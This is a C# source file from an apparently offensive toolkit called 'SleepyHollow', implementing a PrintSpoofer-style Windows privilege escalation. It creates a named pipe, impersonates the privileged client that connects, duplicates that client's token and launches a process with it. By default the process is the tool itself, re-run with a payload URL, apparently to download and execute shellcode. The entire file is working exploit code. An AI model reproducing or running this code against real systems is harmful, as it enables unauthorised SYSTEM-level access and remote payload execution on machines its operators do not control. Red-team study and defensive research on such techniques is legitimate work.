using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SleepyHollow;

internal static class PrintSpoofer
{
    const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    const uint PIPE_TYPE_BYTE = 0x00000000;
    const uint PIPE_MAX_INSTANCES = 10;
    const uint BUFFER_SIZE_OUT = 0x1000;
    const uint BUFFER_SIZE_IN = 0x1000;
    const uint DEFAULT_TIMEOUT = 0;
    const uint TOKEN_ALL_ACCESS = 0xF01FF;

    internal static void Spoof(string pipeName, string payloadUrl, string executeCmd = null)
    {
        if (executeCmd == null)
        {
            var currentExecutable = Environment.ProcessPath;
            executeCmd = $"{currentExecutable} sc --payload {payloadUrl}";
        }
        Console.WriteLine("Will run command \"{0}\" if successful impersonation", executeCmd);
        var pipe = Lib.CreateNamedPipe(
            pipeName,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE,
            PIPE_MAX_INSTANCES,
            BUFFER_SIZE_OUT,
            BUFFER_SIZE_IN,
            DEFAULT_TIMEOUT,
            IntPtr.Zero
        );
        Console.WriteLine("Created pipe {0} [{1}]", pipeName, pipe);
        Console.WriteLine("Waiting for connection...");
        Lib.ConnectNamedPipe(pipe, IntPtr.Zero);
        Console.WriteLine("Connected to pipe {0}", pipeName);
        Lib.ImpersonateNamedPipeClient(pipe);
        Lib.OpenThreadToken(Lib.GetCurrentThread(), TOKEN_ALL_ACCESS, false, out var hToken);
        Console.WriteLine($"Got token 0x{hToken:X}");
        int tokenInfoLength = 0;
        Lib.GetTokenInformation(
            hToken,
            TOKEN_INFORMATION_CLASS.TokenUser,
            IntPtr.Zero,
            0,
            ref tokenInfoLength
        );
        var tokenInfo = Marshal.AllocHGlobal((int)tokenInfoLength);

        if (
            Lib.GetTokenInformation(
                hToken,
                TOKEN_INFORMATION_CLASS.TokenUser,
                tokenInfo,
                tokenInfoLength,
                ref tokenInfoLength
            )
        )
        {
            Console.WriteLine($"Got token info of length {tokenInfoLength}");
            var token = (TOKEN_USER?)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_USER));
            if (token != null)
            {
                Console.WriteLine($"Got token user {token.Value.User.Sid}");
                if (Lib.ConvertSidToStringSid(token.Value.User.Sid, out var ptrSid))
                {
                    var sid = Marshal.PtrToStringAuto(ptrSid);
                    Marshal.FreeHGlobal(ptrSid);
                    Console.WriteLine($"Found SID {sid}");
                }
                Marshal.FreeHGlobal(tokenInfo);
                Lib.DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out IntPtr hSystemToken);
                StringBuilder sbSystemDir = new StringBuilder(256);
                _ = Lib.GetSystemDirectory(sbSystemDir, 256);
                _ = Lib.CreateEnvironmentBlock(out nint env, hSystemToken, false);

                var name = WindowsIdentity.GetCurrent().Name;
                Console.WriteLine("Impersonated user is: " + name);

                Lib.RevertToSelf();
                var si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "WinSta0\\Default";
                Lib.CreateProcessWithTokenW(
                    hSystemToken,
                    (uint)LogonFlags.WithProfile,
                    null,
                    executeCmd,
                    (uint)CreationFlags.UnicodeEnvironment,
                    env,
                    sbSystemDir.ToString(),
                    ref si,
                    out PROCESS_INFORMATION pi
                );
            }
            else
            {
                Console.WriteLine("Failed to get token user");
            }
        }
    }
}
